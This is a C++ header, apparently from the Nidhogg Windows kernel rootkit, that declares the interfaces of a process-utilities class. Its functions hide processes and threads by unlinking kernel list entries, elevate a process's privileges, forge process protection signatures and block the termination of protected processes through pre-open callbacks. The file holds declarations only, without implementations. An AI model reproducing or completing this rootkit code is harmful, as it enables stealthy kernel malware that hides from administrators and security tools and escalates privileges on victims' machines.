#pragma once
#include "pch.h"
#include "MemoryHelper.hpp"

extern "C" {
	#include "WindowsTypes.hpp"
}
#include "NidhoggCommon.h"

// Definitions.
constexpr SIZE_T MAX_PIDS = 256;
constexpr SIZE_T MAX_TIDS = 256;
constexpr SIZE_T SYSTEM_PROCESS_PID = 0x4;
constexpr SIZE_T PROCESS_TERMINATE = 0x1;
constexpr SIZE_T PROCESS_CREATE_THREAD = 0x2;
constexpr SIZE_T PROCESS_VM_READ = 0x10;
constexpr SIZE_T PROCESS_VM_OPERATION = 0x8;

#define VALID_PROCESS(Pid)(Pid > 0 && Pid != SYSTEM_PROCESS_PID)

// Structs.
struct OutputProtectedProcessesList {
	ULONG PidsCount;
	ULONG Processes[MAX_PIDS];
};

struct ProtectedProcessesList {
	FastMutex Lock;
	ULONG LastIndex;
	ULONG PidsCount;
	ULONG Processes[MAX_PIDS];
};

struct ProtectedProcess {
	ULONG Pid;
	bool Protect;
};

struct HiddenProcess {
	ULONG Pid;
	bool Hide;
};

struct HiddenProcessListItem {
	ULONG Pid;
	PLIST_ENTRY ListEntry;
};

struct HiddenProcessList {
	FastMutex Lock;
	ULONG LastIndex;
	ULONG PidsCount;
	HiddenProcessListItem Processes[MAX_PIDS];
};

struct ProcessSignature {
	ULONG Pid;
	UCHAR SignerType;
	UCHAR SignatureSigner;
};

struct ProtectedThread {
	ULONG Tid;
	bool Protect;
};

struct OutputThreadsList {
	ULONG TidsCount;
	ULONG Threads[MAX_TIDS];
};

struct ThreadsList {
	FastMutex Lock;
	ULONG LastIndex;
	ULONG TidsCount;
	ULONG Threads[MAX_TIDS];
};

struct InputHiddenThread {
	ULONG Tid;
	bool Hide;
};

struct HiddenThread {
	ULONG Pid;
	ULONG Tid;
	PLIST_ENTRY ListEntry;
};

struct HiddenThreadsList {
	FastMutex Lock;
	ULONG LastIndex;
	ULONG TidsCount;
	HiddenThread HiddenThreads[MAX_TIDS];
};

class ProcessUtils {
private:
	ThreadsList ProtectedThreads;
	HiddenThreadsList HiddenThreads;
	ProtectedProcessesList ProtectedProcesses;
	HiddenProcessList HiddenProcesses;

	bool AddHiddenProcess(PLIST_ENTRY entry, ULONG pid);
	PLIST_ENTRY GetHiddenProcess(ULONG pid);
	void ClearHiddenProcesses();
	bool AddHiddenThread(HiddenThread thread);
	HiddenThread GetHiddenThread(ULONG tid);
	NTSTATUS UnhideThread(HiddenThread thread);
	void ClearHiddenThreads();
	void RemoveListLinks(PLIST_ENTRY current);
	void AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target);

public:
	void* operator new(size_t size) {
		return AllocateMemory<PVOID>(size, false);
	}

	void operator delete(void* p) {
		if (p)
			ExFreePoolWithTag(p, DRIVER_TAG);
	}

	ProcessUtils();
	~ProcessUtils();

	void ClearProtectedThreads();
	bool FindThread(ULONG tid);
	bool AddThread(ULONG tid);
	bool RemoveThread(ULONG tid);
	void QueryProtectedThreads(OutputThreadsList* list);
	NTSTATUS HideThread(ULONG tid);
	NTSTATUS UnhideThread(ULONG tid);

	void ClearProtectedProcesses();
	bool FindProcess(ULONG pid);
	bool AddProcess(ULONG pid);
	bool RemoveProcess(ULONG pid);
	void QueryProtectedProcesses(OutputProtectedProcessesList* list);
	NTSTATUS ElevateProcess(ULONG pid);
	NTSTATUS SetProcessSignature(ProcessSignature* ProcessSignature);
	NTSTATUS UnhideProcess(ULONG pid);
	NTSTATUS HideProcess(ULONG pid);

	NTSTATUS FindPidByName(WCHAR* processName, ULONG* pid);
	ULONG GetProtectedProcessesCount() { return this->ProtectedProcesses.PidsCount; }
	ULONG GetProtectedThreadsCount() { return this->ProtectedThreads.TidsCount; }
};

inline ProcessUtils* NidhoggProccessUtils;

OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
OB_PREOP_CALLBACK_STATUS OnPreOpenThread(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
